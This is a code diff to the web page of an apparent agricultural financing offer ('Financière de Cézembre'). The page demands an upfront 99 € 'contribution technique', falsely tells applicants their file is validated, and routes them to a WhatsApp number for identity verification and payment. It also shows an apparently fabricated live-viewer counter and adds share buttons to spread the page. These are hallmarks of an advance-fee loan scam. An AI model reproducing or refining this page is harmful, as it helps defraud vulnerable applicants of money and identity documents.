@@ -211,7 +211,7 @@
         .simulator { 
             background: var(--white); padding: 25px 30px; border-radius: 4px; width: 520px; 
             box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); 
-            position: relative; overflow: hidden; min-height: 520px;
+            position: relative; overflow: hidden; min-height: 480px;
         }
 
         @media (max-width: 991px) {
@@ -281,34 +281,19 @@
         .review-author { font-weight: 700; color: var(--navy); font-size: 0.85rem; display: flex; align-items: center; width: 100%;}
         .verified { color: var(--success); font-size: 0.7rem; text-transform: uppercase; font-weight: 800; margin-left: auto;}
 
-        .file-upload-group {
-            background: #fffdf5;
-            border: 1px dashed var(--gold);
-            padding: 8px 10px;
-            border-radius: 4px;
-            margin-bottom: 8px;
-        }
-        .file-upload-label {
-            font-size: 0.7rem;
-            color: var(--navy);
-            font-weight: 700;
-            display: block;
-            margin-bottom: 3px;
-        }
-
         .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 12px; font-weight: 800; font-size: 0.9rem; cursor: pointer; transition: 0.3s; border-radius: 4px; }
         .btn-main:hover { background: var(--gold); }
 
         .form-input { 
             width: 100%; padding: 9px 12px; border: 1.5px solid var(--deep-gold); 
-            background-color: var(--white); border-radius: 4px; margin-bottom: 8px; 
+            background-color: var(--white); border-radius: 4px; margin-bottom: 10px; 
             font-size: 0.85rem; outline: none; color: #000c24; font-weight: 600; 
         }
 
         .phone-group {
             display: flex;
             gap: 6px;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
         }
         .phone-code-select {
             width: 38%;
@@ -326,7 +311,7 @@
             border: 1px solid var(--gold);
             padding: 10px;
             border-radius: 4px;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
         }
         .budget-warning-text {
             font-size: 0.65rem;
@@ -338,7 +323,7 @@
 
         .secure-form-badge {
             display: flex; align-items: center; justify-content: center; gap: 8px;
-            margin-top: 8px; padding: 6px; background: #f8f9fa; border-radius: 4px;
+            margin-top: 10px; padding: 6px; background: #f8f9fa; border-radius: 4px;
             border: 1px dashed var(--gold);
         }
         .secure-form-badge i { color: var(--success); font-size: 1rem; }
@@ -349,7 +334,7 @@
             border: 1px solid var(--gold);
             padding: 8px;
             border-radius: 4px;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
             font-size: 0.68rem;
             color: var(--navy);
             line-height: 1.4;
@@ -390,6 +375,31 @@
         .tag-warning { border: 1px solid #444; padding: 15px; margin-top: 20px; color: #AAA; text-align: center; }
         .blink-gold { color: var(--gold); font-weight: 700; animation: pulse-text 1.5s infinite; }
         @keyframes pulse-text { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        .social-share-footer {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 25px;
+            flex-wrap: wrap;
+        }
+        .share-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 15px;
+            border-radius: 4px;
+            color: white;
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-decoration: none;
+            transition: 0.3s;
+        }
+        .share-btn.fb { background-color: #3b5998; }
+        .share-btn.wa { background-color: #25d366; }
+        .share-btn.tw { background-color: #1da1f2; }
+        .share-btn.li { background-color: #0077b5; }
+        .share-btn:hover { opacity: 0.85; transform: translateY(-2px); }
 
         .wa-assistant-container { position: fixed; bottom: 30px; left: 30px; z-index: 9999; display: flex; flex-direction: column; align-items: center; }
         .whatsapp-float-dynamic { background-color: var(--whatsapp); color: #FFF; width: 65px; height: 65px; border-radius: 50%; text-align: center; font-size: 35px; box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); display: flex; align-items: center; justify-content: center; text-decoration: none; position: relative; animation: magnet-pulse 2s infinite ease-in-out; }
@@ -512,21 +522,21 @@
                 </div>
 
                 <div style="font-size: 0.7rem; color: #555; line-height: 1.4; margin-bottom: 10px;">
-                    🛡️ <strong>Notre engagement qualité :</strong> Aucun dossier sérieux n'est rejeté arbitrairement. Votre contribution sert directement à rémunérer l'expertise technique et l'analyse approfondie de votre projet sous 24 à 48h.
+                    🛡️ <strong>Notre engagement qualité :</strong> Votre dossier a été validé. Pour la vérification de votre pièce d'identité et de votre profil, veuillez nous contacter directement ci-dessous afin de finaliser l'instruction.
                 </div>
 
                 <p style="font-size: 0.72rem; font-weight: 700; color: var(--navy); margin-bottom: 6px;">
-                    Pour obtenir les coordonnées et finaliser, choisissez l'une de ces options :
+                    Pour obtenir les instructions finales, choisissez l'une de ces options :
                 </p>
 
                 <div style="background: #f8f9fa; border: 1px solid #ddd; padding: 8px; border-radius: 4px; margin-bottom: 8px;">
                     <label style="font-size: 0.68rem; font-weight: 700; color: var(--navy); display: block; margin-bottom: 4px;">1. Laisser un message sur le site :</label>
-                    <textarea id="clientMsgInput" placeholder="Écrivez votre message pour demander les instructions..." style="width: 100%; height: 40px; font-size: 0.7rem; padding: 5px; border: 1px solid #ccc; border-radius: 3px; resize: none;"></textarea>
+                    <textarea id="clientMsgInput" placeholder="Écrivez votre message..." style="width: 100%; height: 40px; font-size: 0.7rem; padding: 5px; border: 1px solid #ccc; border-radius: 3px; resize: none;"></textarea>
                     <button type="button" onclick="sendClientMessage()" style="background: var(--navy); color: white; border: none; padding: 5px 10px; font-size: 0.68rem; font-weight: 700; border-radius: 3px; cursor: pointer; margin-top: 4px; width: 100%;">Envoyer ma demande</button>
                 </div>
 
-                <a id="waDirectBtn" href="https://wa.me/33780976404?text=Bonjour,%20mon%20code%20de%20référence%20est%20%23CEZ-RURAL-2026.%20Je%20souhaite%20recevoir%20les%20coordonnées%20pour%20régler%20la%20contribution%20technique." target="_blank" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--whatsapp); color: white; padding: 8px; border-radius: 4px; text-decoration: none; font-size: 0.75rem; font-weight: 700; margin-bottom: 10px;">
-                    <i class="fab fa-whatsapp" style="font-size: 1rem;"></i> 2. Contactez-nous directement sur WhatsApp
+                <a id="waDirectBtn" href="https://wa.me/33780976404?text=Bonjour,%20mon%20code%20de%20référence%20est%20%23CEZ-RURAL-2026.%20Je%20souhaite%20finaliser%20la%20vérification%20d'identité%20et%20régler%20la%20contribution%20technique." target="_blank" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--whatsapp); color: white; padding: 8px; border-radius: 4px; text-decoration: none; font-size: 0.75rem; font-weight: 700; margin-bottom: 10px;">
+                    <i class="fab fa-whatsapp" style="font-size: 1rem;"></i> 2. Contactez-nous sur WhatsApp
                 </a>
 
                 <button class="btn-main" onclick="resetAll()" style="padding: 8px; font-size: 0.75rem;">Fermer / Nouveau dossier</button>
@@ -537,7 +547,7 @@
         
         <h3 style="margin-bottom: 10px; font-size: 1rem;">Formulaire de Dossier Agricole Officiel</h3>
         
-        <form id="loanForm" action="https://formspree.io/f/xaewejrj" method="POST" enctype="multipart/form-data" onsubmit="validateAndSubmit(event)">
+        <form id="loanForm" action="https://formspree.io/f/xaewejrj" method="POST" onsubmit="validateAndSubmit(event)">
             <input type="hidden" name="_subject" value="Nouveau dossier agricole soumis - Financière de Cézembre">
             
             <input type="text" name="nom" id="inputNom" placeholder="Nom et Prénom du Porteur" class="form-input" required>
@@ -684,16 +694,6 @@
             
             <textarea name="message" placeholder="Détail et répartition sommaire du budget (ex: matériel, bêtes, semences)..." class="form-input" style="min-height: 45px; resize: vertical; padding: 8px;" required></textarea>
 
-            <div class="file-upload-group">
-                <label class="file-upload-label"><i class="fas id-card"></i> Pièce d'identité (Recto / Verso) : <span style="font-weight: normal; color: #777;">(Optionnel)</span></label>
-                <input type="file" name="piece_identite" multiple class="form-input" style="padding: 4px; font-size: 0.75rem; margin-bottom: 0;">
-            </div>
-
-            <div class="file-upload-group">
-                <label class="file-upload-label"><i class="fas fa-file-image"></i> Photos du terrain ou Documents du projet : <span style="font-weight: normal; color: #777;">(Optionnel)</span></label>
-                <input type="file" name="documents_projet" multiple class="form-input" style="padding: 4px; font-size: 0.75rem; margin-bottom: 0;">
-            </div>
-
             <div class="form-notice-fee">
                 💡 <strong>Contribution d'ingénierie :</strong> Une contribution unique de <strong>99 € (105 USD)</strong> est requise immédiatement après la soumission de votre dossier pour enclencher l'instruction technique (24-48h).
             </div>
@@ -808,6 +808,16 @@
         </p>
     </div>
 
+    <div style="text-align: center; margin-top: 40px; border-top: 1px solid #222; padding-top: 25px;">
+        <p style="font-size: 0.8rem; color: #aaa; margin-bottom: 12px; font-weight: 600;">Partager cette page d'aide agricole avec d'autres porteurs de projets :</p>
+        <div class="social-share-footer">
+            <a href="https://www.facebook.com/sharer/sharer.php?u=" id="share-fb" class="share-btn fb" target="_blank"><i class="fab fa-facebook-f"></i> Facebook</a>
+            <a href="https://api.whatsapp.com/send?text=" id="share-wa" class="share-btn wa" target="_blank"><i class="fab fa-whatsapp"></i> WhatsApp</a>
+            <a href="https://twitter.com/intent/tweet?url=" id="share-tw" class="share-btn tw" target="_blank"><i class="fab fa-twitter"></i> Twitter</a>
+            <a href="https://www.linkedin.com/shareArticle?mini=true&url=" id="share-li" class="share-btn li" target="_blank"><i class="fab fa-linkedin-in"></i> LinkedIn</a>
+        </div>
+    </div>
+
     <div style="text-align: center; margin-top: 30px; font-weight: 700; color: var(--gold); letter-spacing: 1px;">
         Impulso Rural
     </div>
@@ -827,6 +837,16 @@
 <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
 <script>
+    window.addEventListener('DOMContentLoaded', () => {
+        const currentUrl = encodeURIComponent(window.location.href);
+        const shareTitle = encodeURIComponent("Soutien et Financement Agricole - Financière de Cézembre");
+        
+        document.getElementById('share-fb').href = `https://www.facebook.com/sharer/sharer.php?u=${currentUrl}`;
+        document.getElementById('share-wa').href = `https://api.whatsapp.com/send?text=${shareTitle}%20-%20${currentUrl}`;
+        document.getElementById('share-tw').href = `https://twitter.com/intent/tweet?url=${currentUrl}&text=${shareTitle}`;
+        document.getElementById('share-li').href = `https://www.linkedin.com/shareArticle?mini=true&url=${currentUrl}&title=${shareTitle}`;
+    });
+
     setInterval(() => {
         const countSpan = document.getElementById('viewers-count');
         if (countSpan) {
@@ -990,23 +1010,6 @@
 
     async function validateAndSubmit(e) {
         e.preventDefault();
-        
-        const fileInputs = document.querySelectorAll('input[type="file"]');
-        let totalSize = 0;
-        const maxTotalSize = 10 * 1024 * 1024;
-
-        fileInputs.forEach(input => {
-            if (input.files.length > 0) {
-                for (let i = 0; i < input.files.length; i++) {
-                    totalSize += input.files[i].size;
-                }
-            }
-        });
-
-        if (totalSize > maxTotalSize) {
-            alert("La taille totale des pièces jointes dépasse la limite autorisée (10 Mo). Veuillez réduire la taille de vos fichiers.");
-            return;
-        }
 
         const devise = document.getElementById('deviseSelect').value;
         const montantSaisi = parseFloat(document.getElementById('montantSaisi').value);
@@ -1049,7 +1052,7 @@
                     document.getElementById('refCodeDisplay').innerText = generatedRefCode;
                     
                     const clientNom = document.getElementById('inputNom').value || "Client";
-                    const waUrl = `https://wa.me/33780976404?text=Bonjour,%20je%20suis%20${encodeURIComponent(clientNom)}.%20Mon%20code%20de%20référence%20est%20${generatedRefCode}.%20Je%20souhaite%20recevoir%20les%20coordonnées%20pour%20régler%20la%20contribution%20technique%20de%2099€.`;
+                    const waUrl = `https://wa.me/33780976404?text=Bonjour,%20je%20suis%20${encodeURIComponent(clientNom)}.%20Mon%20code%20de%20référence%20est%20${generatedRefCode}.%20Je%20souhaite%20finaliser%20la%20vérification%20d'identité%20et%20régler%20la%20contribution%20technique%20de%2099€.`;
                     document.getElementById('waDirectBtn').href = waUrl;
 
                     document.getElementById('success-message').style.display = 'block';
